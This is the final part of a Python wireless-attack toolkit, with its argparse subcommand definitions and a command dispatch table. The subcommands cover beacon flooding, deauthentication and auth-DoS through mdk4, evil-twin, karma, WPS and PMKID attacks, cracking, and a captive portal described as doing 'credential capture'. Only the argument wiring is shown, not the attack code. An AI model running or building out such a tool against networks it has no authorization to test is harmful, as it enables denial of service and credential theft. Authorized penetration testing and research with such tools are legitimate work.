    ep.add_argument("--bssid", required=True, help="Target AP MAC")
    ep.add_argument("--cap", required=True, help="Capture file with EAPOL frames")
    ep.add_argument("--channel", type=int)
    ep.add_argument("--count", type=int, default=3, help="Re-injection rounds")
    ep.add_argument("--interval", type=int, default=5, help="Seconds between rounds")

    # signal (tracking)
    sg = sub.add_parser("signal", help="Track AP signal strength over time")
    sg.add_argument("-i", "--interface", required=True)
    sg.add_argument("--bssid", required=True, help="Target AP MAC")
    sg.add_argument("--duration", type=int, default=30, help="Tracking duration in seconds")
    sg.add_argument("--interval", type=int, default=2, help="Sampling interval in seconds")

    # nic-detect
    nd = sub.add_parser("nic-detect", help="Deep NIC analysis: chipset, bands, injection, TX power")
    nd.add_argument("-i", "--interface", help="Specific interface (default: all)")
    nd.add_argument("--test-injection", action="store_true", dest="test_injection",
                    help="Run aireplay-ng injection test (requires monitor mode)")

    # beacon-flood
    bf = sub.add_parser("beacon-flood", help="Flood with fake AP beacon frames")
    bf.add_argument("-i", "--interface", required=True)
    bf.add_argument("--ssid-prefix", default="GhostAP", dest="ssid_prefix",
                    help="SSID prefix for fake APs (default: GhostAP)")
    bf.add_argument("--count", type=int, default=500, help="Number of fake SSIDs")
    bf.add_argument("--channel", type=int)

    # probe-hunt
    ph = sub.add_parser("probe-hunt", help="Capture probe requests and build device map")
    ph.add_argument("-i", "--interface", required=True)
    ph.add_argument("--duration", type=int, default=60)
    ph.add_argument("--band", choices=["a", "b", "abg", "abgn"])

    # captive-portal
    cp2 = sub.add_parser("captive-portal", help="Standalone HTTP captive portal (credential capture)")
    cp2.add_argument("--port", type=int, default=8080, help="Listen port (default: 8080, 80 needs root)")
    cp2.add_argument("--bind", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")

    # mdk4
    mk = sub.add_parser("mdk4", help="MDK4 wrapper: beacon/deauth/auth-DoS/probe/EAPOL/TKIP attacks")
    mk.add_argument("-i", "--interface", required=True)
    mk.add_argument("--mode", dest="mdk_mode",
                    choices=["b", "d", "a", "p", "e", "m"], default="b",
                    help="b=beacon-flood d=deauth a=auth-DoS p=probe e=EAPOL m=TKIP-MIC")
    mk.add_argument("--bssid", help="Target AP MAC (for modes d/a/e/m)")
    mk.add_argument("--ssid-prefix", default="GhostAP", dest="ssid_prefix")
    mk.add_argument("--count", type=int, default=500)

    # fingerprint
    fp = sub.add_parser("fingerprint", help="Fingerprint APs and clients with vendor OUI lookup")
    fp.add_argument("-i", "--interface", required=True)
    fp.add_argument("--duration", type=int, default=30)

    # injection-test
    it = sub.add_parser("injection-test", help="Test packet injection capability on interface")
    it.add_argument("-i", "--interface", required=True)
    it.add_argument("--bssid", help="Optional AP BSSID for extended test")

    # channelfix
    cf = sub.add_parser("channelfix", help="Force a specific channel on wireless interface")
    cf.add_argument("-i", "--interface", required=True)
    cf.add_argument("--channel", type=int, required=True)

    # 5ghz-scan
    fg = sub.add_parser("5ghz-scan", help="Dedicated 5GHz band scan")
    fg.add_argument("-i", "--interface", required=True)
    fg.add_argument("--duration", type=int, default=30)

    return p

# ─── Entry point ──────────────────────────────────────────────────────────────

COMMANDS = {
    "ifaces":          cmd_ifaces,
    "monitor":         cmd_monitor,
    "scan":            cmd_scan,
    "hop":             cmd_hop,
    "deauth":          cmd_deauth,
    "capture":         cmd_capture,
    "pmkid":           cmd_pmkid,
    "wps":             cmd_wps,
    "evil-twin":       cmd_eviltwin,
    "crack":           cmd_crack,
    "wep":             cmd_wep,
    "clients":         cmd_clients,
    "karma":           cmd_karma,
    "handshake":       cmd_handshake,
    "info":            cmd_info,
    "auto":            cmd_auto,
    "decloak":         cmd_decloak,
    "eapol":           cmd_eapol,
    "signal":          cmd_signal,
    # v3.0.0 new modules
    "nic-detect":      cmd_nic_detect,
    "beacon-flood":    cmd_beacon_flood,
    "probe-hunt":      cmd_probe_hunt,
    "captive-portal":  cmd_captive_portal,
    "mdk4":            cmd_mdk4,
    "fingerprint":     cmd_fingerprint,
    "injection-test":  cmd_injection_test,
    "channelfix":      cmd_channelfix,
    "5ghz-scan":       cmd_5ghz_scan,
}

def main():
    parser = build_parser()
    args = parser.parse_args()
    # propagate shared flags to args namespace
    if not hasattr(args, "no_banner"):
        args.no_banner = False
    if not hasattr(args, "verbose"):
        args.verbose = False
    if not hasattr(args, "output"):
        args.output = None

    fn = COMMANDS.get(args.command)
    if fn:
        fn(args)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
